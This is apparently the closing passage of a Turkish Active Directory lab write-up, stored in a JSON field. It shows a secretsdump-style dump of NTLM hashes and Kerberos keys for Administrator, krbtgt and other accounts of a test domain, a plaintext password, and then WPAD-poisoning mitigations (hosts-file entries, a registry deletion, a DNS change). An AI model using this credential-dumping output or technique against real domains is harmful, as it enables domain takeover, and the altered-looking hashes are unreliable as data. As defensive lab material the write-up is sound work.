secretsAdministrator:500:aad3b435b51404eeaad3b435b51404ee:3bf95c84497123489f0384be1fb121:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::krbtgt:502:aad3b435b51404eeaad3b435b51404ee:25c12e73cb612345833d4228a4e8e0:::OFFENSIVE.LOCAL\\dumbuser:1104:aad3b435b51404eeaad3b435b51404ee:d1f350470cc39ebc66ac6e123411531d:::FAZueTPyQM:1127:aad3b435b51404eeaad3b435b51404ee:db34e7133c9bee4421fb6be9842d20:::OFFENSIVE.LOCAL\\test:1128:aad3b435b51404eeaad3b435b51404ee:d1f350470cc39e1234566e20e411531d:::lbjffhrUxT:1130:aad3b435b51404eeaad3b435b51404ee:3859cf5186d837389346b461234502d2:::hXfgRLUBuL:1131:aad3b435b51404eeaad3b435b51404ee:c499dbee61bcc0e3012345960223c1d1:::OqTlMMpPRn:1132:aad3b435b51404eeaad3b435b51404ee:7a1503b1cc5a7d96f0123456a71f2509:::WIN-507CQFD84EB$:1000:aad3b435b51404eeaad3b435b51404ee:9a6b07c64dc9c123456af0911f2c9b19:::pwn$:1119:aad3b435b51404eeaad3b435b51404ee:e577556ce0e89402bf7d711234536d57c:::NYZJFADA$:1120:aad3b435b51404eeaad3b435b51404ee:8213202a87fcfc124347459e827a7a6:::ZMNKTDFV$:1121:aad3b435b51404eeaad3b435b51404ee:c1430791b9ec3079d12333052bf3d4ce:::BEYUOZEQ$:1122:aad3b435b51404eeaad3b435b51404ee:451b907d856f123b3a3cd8f261fe8d2a:::ETCNUWTT$:1123:aad3b435b51404eeaad3b435b51404ee:bab69f384411172c100dee1236f9d99a:::AUTEKFLI$:1124:aad3b435b51404eeaad3b435b51404ee:8d507ca1f8910741239a5985b7f220cd:::XIZVSLWV$:1125:aad3b435b51404eeaad3b435b51404ee:39783812312927698cd03a60c0c70a6:::QZYAWJJU$:1126:aad3b435b51404eeaad3b435b51404ee:53dab6801ee6aa4b1a0bc123479bb6c9:::[*] Kerberos keys grabbedAdministrator:aes256-cts-hmac-sha1-96:857fbd2f3e6e047660d137eef5df165f7741e9e2b19611234b54dec0f0fcdcfdAdministrator:aes128-cts-hmac-sha1-96:5b1baf97d3f2f123437b43639901eeb0Administrator:des-cbc-md5:251ff87a3123802akrbtgt:aes256-cts-hmac-sha1-96:9a77da422c81273ff1d19e43bc5448a123456387f5e8112cc92414daf746d8f0krbtgt:aes128-cts-hmac-sha1-96:bf11d0cb17e6ae72bbe12346be96956fkrbtgt:des-cbc-md5:5bd345b123b383dcOFFENSIVE.LOCAL\\dumbuser:aes256-cts-hmac-sha1-96:f313675b725b578f9a2d6b1234d6b7eb4d0caa6a775f5edd6b687ca1e403d420OFFENSIVE.LOCAL\\dumbuser:aes128-cts-hmac-sha1-96:0c15c7656ae210a6b66b8123454ac082OFFENSIVE.LOCAL\\dumbuser:des-cbc-md5:e5a89267ce1f12e3FAZueTPyQM:aes256-cts-hmac-sha1-96:773d6670ddf05f73f8f0a7266f9a02fcaffae161ce0a3dde31234c2ffca37eaFAZueTPyQM:aes128-cts-hmac-sha1-96:4c3f2f91fa78658ddfed126f791b5a89FAZueTPyQM:des-cbc-md5:260ef1230883e3e5OFFENSIVE.LOCAL\\test:aes256-cts-hmac-sha1-96:1619c5cf150e1efc988572d4910c37265aef98dca01233d0a20ff5cf7b82ba60OFFENSIVE.LOCAL\\test:aes128-cts-hmac-sha1-96:0b5dddbe61ceb1234d34a85bf589a08e9OFFENSIVE.LOCAL\\test:des-cbc-md5:f4e00b588123dae43lbjffhrUxT:aes256-cts-hmac-sha1-96:3c60df06b033edb0bf7252e912345d843e2b93e51810971fdf8948de1ff9c4lbjffhrUxT:aes128-cts-hmac-sha1-96:c8a5836390bf3d3cc08b652310ba6fclbjffhrUxT:des-cbc-md5:eada49fdd123ce52hXfgRLUBuL:aes256-cts-hmac-sha1-96:05cacadf097f590dbf28a2579e712345619027bcf0ce8b1b2bd19f432d1b1hXfgRLUBuL:aes128-cts-hmac-sha1-96:665a4410064557799447123496f441fhXfgRLUBuL:des-cbc-md5:a4c8b97123094836dOqTlMMpPRn:aes256-cts-hmac-sha1-96:6edecb0f1234567e55d5e7b528328c8c92ddbc0ff9bc538b845b3fd2919241fOqTlMMpPRn:aes128-cts-hmac-sha1-96:f85d78aadd29fd9123a54d085f5d6a371dOqTlMMpPRn:des-cbc-md5:1aa226b351fbf401WIN-507CQFD84EB$:aes256-cts-hmac-sha1-96:f927897a6ce1f33064210f0523dda95e71bc0a791fe5292c24aa0545a7c97a9dWIN-507CQFD84EB$:aes128-cts-hmac-sha1-96:feabb09658839d713a53123451289269fWIN-507CQFD84EB$:des-cbc-md5:237a01d970ba5b70pwn$:aes256-cts-hmac-sha1-96:2d6373ad2f13c25e411282cc507cbac65f312345a0057a4cfadf097a416ae9cpwn$:aes128-cts-hmac-sha1-96:dac8d1cb364733299bf123456f5d0d7cpwn$:des-cbc-md5:fde3da3bc27abcc4NYZJFADA$:aes256-cts-hmac-sha1-96:bc27f05b7715d523a2e6dee9312345f941748c91ae452d22715bdc62fa1f8fcbNYZJFADA$:aes128-cts-hmac-sha1-96:3cc5791be98f42228d12345674a523be8NYZJFADA$:des-cbc-md5:c12045ba54ecf2abZMNKTDFV$:aes256-cts-hmac-sha1-96:b69fbadd33c4038dec0a08a2aee1234657a73816c1cf86324797c2eb0762c1cZMNKTDFV$:aes128-cts-hmac-sha1-96:f8e585176c6809d85123465003ba9b5efZMNKTDFV$:des-cbc-md5:19c48c1fd9046df4BEYUOZEQ$:aes256-cts-hmac-sha1-96:30b5e3d11e3b5a4f0fcb2ae512345624472e69938c186745711918226f875c0BEYUOZEQ$:aes128-cts-hmac-sha1-96:bd2ed0b98f5df3b5489c5123467ae3eBEYUOZEQ$:des-cbc-md5:f125670154b921c22fETCNUWTT$:aes256-cts-hmac-sha1-96:25c46571c114137f8261234562beb65f4d02422d3e3949c5c0b31008700e62c6ETCNUWTT$:aes128-cts-hmac-sha1-96:31cf955ea0c68811deb123462ad2526bETCNUWTT$:des-cbc-md5:3bd61c3d51236becAUTEKFLI$:aes256-cts-hmac-sha1-96:cd0b03bd2411ee1a064c8fa78f7885b15811823b0eb66608512affd6621858c2AUTEKFLI$:aes128-cts-hmac-sha1-96:ba5bf07eaaff96123454bb0d161253aaAUTEKFLI$:des-cbc-md5:29c8c7cb9112d51aXIZVSLWV$:aes256-cts-hmac-sha1-96:711a8ff4fa4b8a01c5381ac0ae891188b42ca41234652d2848e8475b783745d2bXIZVSLWV$:aes128-cts-hmac-sha1-96:e9c9a753fad3d12345216f8a4ab09bd0b11XIZVSLWV$:des-cbc-md5:109d08a7212342bQZYAWJJU$:aes256-cts-hmac-sha1-96:a129f2a9abcd9efbb8b6966b0eb212342c5fe291bf6291f3dd4004b093e44a16eQZYAWJJU$:aes128-cts-hmac-sha1-96:2e295ece2f27212342fa97182eaf5a48QZYAWJJU$:des-cbc-md5:5edc1238cd3e95b[*] Cleaning up...  Parola: BANYv(PCQGXf-qnNasıl önlenir?Kullanıcıların hosts dosyalarına wpad olarak kendi adreslerini gösterilmesi sağlanabilir.C:\\Users\\dumbuser.OFFENSIVE&gt;echo '127.0.0.1 wpad' &gt;&gt; C:\\Windows\\System32\\Drivers\\etc\\hostsC:\\Users\\dumbuser.OFFENSIVE&gt;echo '127.0.0.1 wpad.local' &gt;&gt; C:\\Windows\\System32\\Drivers\\etc\\hostsC:\\Users\\dumbuser.OFFENSIVE&gt;echo '192.168.1.50 wpad.offensive.local' &gt;&gt; C:\\Windows\\System32\\Drivers\\etc\\hostsZehirlenen host içerisinde bağlantının temizlenmesi için gerekli olan registry kaydı silinir.C:\\Users\\dumbuser.OFFENSIVE&gt;reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections\" /v DefaultConnectionSettingsDelete the registry value DefaultConnectionSettings (Yes/No)? yesThe operation completed successfully.Primary DNS adresi domain IP adresi olarak girilir.C:\\Users\\dumbuser.OFFENSIVE&gt;netsh interface ipv4 set dns name=\"Ethernet\" static 192.168.1.50"
  }
  
]

